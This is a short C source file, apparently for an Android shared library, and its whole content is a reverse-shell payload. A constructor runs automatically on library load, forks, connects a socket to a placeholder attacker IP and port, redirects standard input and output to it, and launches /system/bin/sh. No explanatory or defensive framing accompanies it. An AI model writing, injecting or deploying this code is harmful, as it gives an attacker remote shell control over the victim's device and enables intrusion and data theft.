#include <stdio.h>
#include <unistd.h>

#include <sys/socket.h>
#include <arpa/inet.h> //htons
#include <netinet/in.h>
#include <sys/types.h>

#define REMOTE_HOST "127.0.0.1" // Add IP
#define REMOTE_PORT 7070 // Add port

void __attribute__ ((constructor)) reverse()
{
    int s;
    struct sockaddr_in sa;

    if(fork() == 0) {

        sa.sin_family = AF_INET;
        sa.sin_addr.s_addr = inet_addr(REMOTE_HOST);
        sa.sin_port = htons(REMOTE_PORT);

        s = socket(AF_INET, SOCK_STREAM, 0);
        connect(s, (struct sockaddr *) &sa, sizeof(sa));

        dup2(s, 0); // stdin
        dup2(s, 1); // stdout
        dup2(s, 2); // stderr

        execve("/system/bin/sh", 0, 0);
    }
}